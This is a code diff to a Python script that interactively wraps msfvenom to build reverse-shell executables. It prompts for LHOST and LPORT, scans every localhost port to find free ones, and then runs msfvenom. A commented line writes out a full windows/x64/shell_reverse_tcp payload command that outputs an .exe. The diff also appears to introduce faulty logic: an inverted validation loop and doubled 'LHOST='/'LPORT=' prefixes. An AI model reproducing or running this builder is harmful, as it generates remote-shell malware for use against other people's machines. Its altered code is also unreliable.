@@ -160,33 +160,39 @@ def  Lportnhost():
   global arg_four
   os.system('cls' if os.name == 'nt' else "printf '\033c'")
   #Find Local Host Automation
-  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-  s.connect(("8.8.8.8", 80))
-  ip_address = s.getsockname()[0]
-  print(Fore.RED + "   Question 3: Let move onto building the file, is the IP below your current IP if yes please press enter if not please retype your LHOST in the command line? ")
-  print("   IP: " + str(ip_address))
+  # s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  # s.connect(("8.8.8.8", 80))
+  # ip_address = s.getsockname()[0]
+  print(Fore.RED + "   Question 3: Let move onto building the file, what is your LHOST in the command line? ")
+  # print("   IP: " + str(ip_address))
   print()
   OS = input(Fore.WHITE + "Command Line: ")
-  
+  ip_address = "LHOST="+OS
 
   #If Lhost wrong
   operatingSystem = ""
-  while OS not in operatingSystem:
+  while OS in operatingSystem:
    os.system('cls' if os.name == 'nt' else "printf '\033c'")
    print(Fore.RED + " What is your LHost that you want?")
    print()
    OS = input(Fore.WHITE + "Command Line: ")
-   ip_address = OS
+   ip_address = "LHOST="+OS
   
   finalPacket += ( " LHOST=" + str(ip_address))
 
   #Lport finder !!!
   os.system('cls' if os.name == 'nt' else "printf '\033c'")
   print(Fore.RED + "   Question 4: Pick an unused port ")
+  print()
+  for port in range(1, 65535):
+        with (socket.socket(socket.AF_INET, socket.SOCK_STREAM)) as sock:
+            res = sock.connect_ex(('localhost', port))
+            if res == 0:
+                print(Fore.GREEN + "   Ports in use: " + str(port))
   # print("   IP: " + str(ip_address))
   print()
   OS = input(Fore.WHITE + "Command Line: ")
-  lPort = OS
+  lPort = "LPORT="+OS
 
   finalPacket += ( " LPORT=" + str(lPort))
 
@@ -231,7 +237,7 @@ def finlization():
   print()
   OS = input(Fore.WHITE + "Command Line: ")
   arg_five = OS
-  arg_six = '-o'
+  arg_six = "-o"
   # finalPacket += ( " -o " + str(namePacket))
 
  
@@ -253,4 +259,3 @@ return_code = subprocess.call([program_call,arg_one,arg_two,ip_address,lPort,arg
 print("output:", return_code)
 # # return_code = subprocess.call(['msfvenom','-p','windows/x64/shell_reverse_tcp','LHOST=10.0.2.15','LPORT=1337','-f','exe','-o','shell_test.exe'])
 # # print("output:", return_code)
-#test for real this time
